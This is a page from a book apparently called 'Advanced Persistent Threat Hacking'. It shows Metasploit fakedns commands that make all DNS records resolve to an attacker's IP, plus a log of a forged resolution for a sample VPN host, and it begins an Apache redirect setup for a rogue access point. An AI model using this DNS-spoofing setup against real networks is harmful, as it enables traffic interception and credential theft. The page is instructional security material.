<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pf11b" class="pf w2 h2" data-page-no="11b"><div class="pc pc11b w2 h2"><div class="t m0 xbe h10 y83 ff1 fs9 fc0 sc0 lsa ws0">260<span class="_ _d"> </span><span class="ff2 fs2 ls8">Advanced Persistent Threat Hacking<span class="_ _1e"/> </span></div><div class="t m0 x3 hd y11c ff4 fs7 fc0 sc0 ls0 ws0">DNS server module within Metasploit to handle all DNS responses. <span class="_ _0"/>T<span class="_ _3"/>o launch this </div><div class="t m0 x3 hd y11d ff4 fs7 fc0 sc0 ls0 ws0">module and set our conguration, use the follo<span class="_ _0"/>wing example:</div><div class="t m0 x3 h44 yc84 fff fse fc0 sc0 ls0 ws0">msf &gt; use auxiliary/server/fakedns </div><div class="t m0 x3 h44 yc85 fff fse fc0 sc0 ls0 ws0">msf auxiliary(fakedns) &gt; set SRVHOST 10.0.0.1</div><div class="t m0 x3 h44 yc86 fff fse fc0 sc0 ls0 ws0">SRVHOST =&gt; 10.0.0.1</div><div class="t m0 x3 h44 ye37 fff fse fc0 sc0 ls0 ws0">msf auxiliary(fakedns) &gt; set TARGETHOST 10.0.0.1</div><div class="t m0 x3 h44 ye38 fff fse fc0 sc0 ls0 ws0">TARGETHOST =&gt; 10.0.0.1</div><div class="t m0 x3 h44 ye39 fff fse fc0 sc0 ls0 ws0">msf auxiliary(fakedns) &gt; set TARGETDOMAIN null</div><div class="t m0 x3 h44 ye3a fff fse fc0 sc0 ls0 ws0">TARGETDOMAIN =&gt; null</div><div class="t m0 x3 h44 ye3b fff fse fc0 sc0 ls0 ws0">msf auxiliary(fakedns) &gt; show options</div><div class="t m0 x4 hd y1b29 ff4 fs7 fc0 sc0 ls0 ws0">The options we congured are</div><div class="t m0 x16 h1f y1b2a ffb fse fc0 sc0 ls0 ws0">c</div><div class="t m0 x1 h2c y1b2b ff3 fs7 fc0 sc0 ls0 ws0">SR<span class="_ _2"/>VHOST<span class="_ _a"> </span><span class="ff4">The IP address to listen on for DNS requests. Note that this </span></div><div class="t m0 x1 hd y1b2c ff4 fs7 fc0 sc0 ls0 ws0">should be the same IP that is handed out by our DHCP server<span class="_ _2"/>.</div><div class="t m0 x16 h1f y1b2d ffb fse fc0 sc0 ls0 ws0">c</div><div class="t m0 x1 h2c y1b2e ff3 fs7 fc0 sc0 ls0 ws0">T<span class="_ _3"/>ARGETHOST<span class="_ _41"> </span><span class="ff4">This is the IP address that all records will resolve to.</span></div><div class="t m0 x16 h1f y1b2f ffb fse fc0 sc0 ls0 ws0">c</div><div class="t m0 x1 h2c y1b30 ff3 fs7 fc0 sc0 ls0 ws0">T<span class="_ _3"/>ARGETDOMAIN<span class="_ _41"> </span><span class="ff4">W<span class="_ _2"/>e can use this option to bypass any domains that we </span></div><div class="t m0 x1 hd y1b31 ff4 fs7 fc0 sc0 ls0 ws0">want the user to visit directly<span class="_ _2"/>. For e<span class="_ _0"/>xample, if we set T<span class="_ _1b"/>ARGETDOMAIN to </div><div class="t m0 x1 hd y1b32 ff4 fs7 fc0 sc0 ls0 ws0">google.com, then any requests for google.com or its subdomains will resolv<span class="_ _0"/>e to </div><div class="t m0 x1 hd y1b33 ff4 fs7 fc0 sc0 ls0 ws0">the correct records. Because we want to resolv<span class="_ _0"/>e all records, we set this option </div><div class="t m0 x1 hd y1b34 ff4 fs7 fc0 sc0 ls0 ws0">to null.</div><div class="t m0 x4 hd y1b35 ff4 fs7 fc0 sc0 ls0 ws0">Follo<span class="_ _0"/>wing is an e<span class="_ _0"/>xample of a forged DNS resolution. <span class="_ _0"/>The client 10.0.0.101 </div><div class="t m0 x3 hd y1b36 ff4 fs7 fc0 sc0 ls0 ws0">queried for vpn.weaktarget.com, and we sent the response that the serv<span class="_ _0"/>er is located </div><div class="t m0 x3 hd y1b37 ff4 fs7 fc0 sc0 ls0 ws0">at 10.0.0.1. The XID is simply the transaction ID for the DNS request.</div><div class="t m0 x3 h40 y1b38 fff fs5 fc0 sc0 ls0 ws0">[*] 10.0.0.101:11181 - DNS - DNS target domain found: vpn.weaktarget.com</div><div class="t m0 x3 h40 y1b39 fff fs5 fc0 sc0 ls0 ws0">[*] 10.0.0.101:11181 - DNS - DNS target domain vpn.weaktarget.com faked</div><div class="t m0 x3 h40 y1b3a fff fs5 fc0 sc0 ls0 ws0">[*] 10.0.0.101:11181 - DNS - XID 5361 (IN::A vpn.weaktarget.com)</div><div class="t m0 x4 hd y1b3b ff4 fs7 fc0 sc0 ls0 ws0">W<span class="_ _3"/>e’ll use <span class="_ _0"/>Apache as our web serv<span class="_ _0"/>er of choice. By doing this, we get all the </div><div class="t m0 x3 hd y1b3c ff4 fs7 fc0 sc0 ls0 ws0">full-blo<span class="_ _0"/>wn features of the most popular web server<span class="_ _2"/>. <span class="_ _0"/>Apache comes preinstalled and </div><div class="t m0 x3 hd y1b3d ff4 fs7 fc0 sc0 ls0 ws0">ready to use in Kali; we’ll just ha<span class="_ _0"/>ve to mak<span class="_ _0"/>e a few minor tweaks. <span class="_ _1b"/>Y<span class="_ _3"/>ou can download </div><div class="t m0 x3 hd y1b3e ff4 fs7 fc0 sc0 ls0 ws0">the <span class="_ _2"/>APT<span class="_ _2"/>-Rogue-AP (ARAP) package, which comes with this entire conguration </div><div class="t m0 x3 hd y1b3f ff4 fs7 fc0 sc0 ls0 ws0">ready to use, but we’<span class="_ _0"/>ll highlight ke<span class="_ _0"/>y components here. First, we’ll utilize the </div><div class="t m0 x3 hd y1b40 ff4 fs7 fc0 sc0 ls0 ws0">Apache module mod_re<span class="_ _0"/>write to handle the URL redirects to handle a user’<span class="_ _0"/>s request, </div><div class="t m0 x3 h3f y1b41 ff4 fs7 fc0 sc0 lsb ws16">regardless of the URL. <span class="_ _0"/>T<span class="_ _3"/>o enable the rewrite module, use the <span class="fff ls0">a2enmod<span class="ff4 ws0"> (apache2 </span></span></div><div class="t m0 x3 hd y1b42 ff4 fs7 fc0 sc0 ls0 ws0">enable module) command as follo<span class="_ _0"/>ws:</div><a class="" href="http://google.com"><div class="d m1" style="border-style:none;position:absolute;left:123.476946px;bottom:407.606954px;width:54.000000px;height:12.000000px;background-color:rgba(255,255,255,0.000001);"/></a><a class="" href="http://google.com"><div class="d m1" style="border-style:none;position:absolute;left:307.301587px;bottom:407.606954px;width:51.000000px;height:12.000000px;background-color:rgba(255,255,255,0.000001);"/></a><a class="" href="http://vpn.weaktarget.com"><div class="d m1" style="border-style:none;position:absolute;left:156.130008px;bottom:327.788360px;width:92.000000px;height:12.000000px;background-color:rgba(255,255,255,0.000001);"/></a></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>